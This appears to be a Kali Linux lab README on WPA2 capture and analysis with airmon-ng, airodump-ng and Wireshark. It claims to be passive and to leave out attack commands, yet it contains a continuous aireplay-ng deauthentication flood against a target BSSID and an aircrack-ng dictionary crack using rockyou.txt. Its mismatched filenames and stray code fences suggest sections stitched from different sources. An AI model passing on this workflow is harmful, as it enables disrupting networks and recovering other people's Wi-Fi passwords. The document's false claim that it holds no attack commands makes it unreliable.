
# Wi-Fi WPA2 Learning Lab — Passive Capture & Analysis (Safe / Ethical)

> **Important:** This repo/document is for **defensive learning only**. Do **not** run attacks or cracking workflows against networks you do not own or do not have **explicit written permission** to test. I will not provide commands for deauthentication attacks or for cracking passphrases. The steps below show passive capture and analysis techniques you can use in a controlled lab using equipment you own.

---

## Overview
This guide documents the hardware and the *passive* commands used during my WPA2 learning lab on Kali Linux. The goal: understand Wi-Fi management frames, observe EAPOL/handshake packets in a controlled environment, and use Wireshark to analyse what happens when clients reauthenticate — **without performing attacks or cracking passwords**.

---

## Hardware
```

Alfa AWUS036NHA

````
- Use a dedicated USB adapter for monitor mode to avoid disrupting your host Wi-Fi.
- Test only on routers and devices you own or have written permission to test.

---

## Preflight checks (host & Kali)
On your Kali VM/host, confirm OS and kernel:
```bash
# Kali version / distro information
cat /etc/os-release

# Kernel / system uname
uname -a
````

Check USB detection on the host (if running in VM):

```bash
# On host (not inside VM)
lsusb
dmesg | tail -n 40
```

If using VirtualBox, ensure USB passthrough (see VM tips below).

---

## See network interfaces

Run these inside Kali to list interfaces and wireless info:

```bash
# show addresses & interfaces
ip addr

# legacy wireless tool (shows mode etc.)
iwconfig
```

If you don't see your adapter, double-check USB passthrough / drivers / kernel messages.

---

## Kill interfering processes

Some network managers or services can interfere with monitor mode. Run:

```bash
sudo airmon-ng check kill
```

> This will stop NetworkManager/wpa\_supplicant (do not forget to restart them after testing).

---

## Start monitor mode

Put your adapter into monitor mode (this will create a monitor interface such as `wlan0mon`, `mon0`, etc.). Replace `wlan0` with your adapter name:

```bash
sudo airmon-ng start wlan0
```

Verify monitor-mode interfaces:

```
sudo airmon-ng    # lists interfaces and their mode
iwconfig          # confirms the interface is in "Monitor" mode
```

---

## Passive discovery with airodump-ng

Use `airodump-ng` to observe nearby APs and their channels. This is **passive** (listening only):


# Start passive scan (replace with your monitor interface)
```
sudo airodump-ng wlan0mon
```

From `airodump-ng` output note the AP BSSID and Channel for your target AP (your own AP in the lab). Example captured values (replace with your own):

* **ESSID / AP BSSID:** `90:9A:4A:B8:F3:FB`
* **Channel:** `2`

---




## Wi-Fi Network Capture and Deauthentication Attack Commands

### First Window: Network Capture
**Command:**
```bash
sudo airodump-ng -w capture1 -c 2 --bssid 90:9A:4A:B8:F3:FB wlan0mon
```

**Instructions:**
- Replace the channel number (`-c 2`) with the target network's channel.
- Replace the BSSID (`90:9A:4A:B8:F3:FB`) with the target network's BSSID.
- Replace `capture1` with your desired output file name (e.g., `capture1`).
- Ensure `wlan0mon` is your network interface in monitor mode.

### Second Window: Deauthentication Attack
**Command:**
```bash
sudo aireplay-ng --deauth 0 -a 90:9A:4A:B8:F3:FB wlan0mon
```

**Instructions:**
- Replace the BSSID (`90:9A:4A:B8:F3:FB`) with the target network's BSSID.
- Ensure `wlan0mon` is your network interface in monitor mode.
- The `--deauth 0` flag sends continuous deauthentication packets until stopped.
```

---
## Analyse captures with Wireshark
```
Open the `.cap` file in Wireshark:

```bash
wireshark capture1-01.cap
```

Use Wireshark display filters to find WPA2 handshake/EAPOL frames:

```
eapol
```

Other useful filters:

```
wlan.fc.type_subtype == 0x0c   # deauthentication frames (view only; do not generate)
wlan_mgt
wlan.fc.type == 0              # management frames
```

* Observe EAPOL packets and the 4-way handshake frame sequence when a client legitimately reauthenticates.
* Save and export views or screenshots for documentation.

---


## Cracking Wi-Fi Password with Aircrack-ng

**Command:**
```bash
aircrack-ng capture1-01.cap -w /usr/share/wordlists/rockyou.txt
```

**Instructions:**
- Ensure you have the `rockyou.txt` wordlist in text format (unzip if necessary on Kali Linux).
- Replace `hack1-01.cap` with the name of your captured file.
- The wordlist path (`/usr/share/wordlists/rockyou.txt`) assumes the default location on Kali Linux; adjust if using a different wordlist or path.
```
---

## Stop monitor mode & restore network

When finished, stop monitor mode and restart network managers:

```bash
# Stop monitor mode (replace with your monitor iface)
sudo airmon-ng stop wlan0mon

# Re-enable Network Manager and wpa_supplicant (example commands)
sudo systemctl start NetworkManager
sudo systemctl start wpa_supplicant
```

---
## Tips for running Kali inside VirtualBox (USB passthrough)

1. Install the VirtualBox Extension Pack (matches your VirtualBox version) to enable USB 2.0/3.0 passthrough.
2. In VirtualBox Manager, with VM powered off → **Settings → USB** → Enable USB Controller (choose EHCI or xHCI).
3. Add a USB filter or attach the device when VM is running: **Devices → USB → \[Your Adapter]**.
4. Ensure your host user is in the `vboxusers` group (Linux hosts):

```bash
sudo usermod -aG vboxusers $USER
# log out and log back in for changes to take effect
```

---


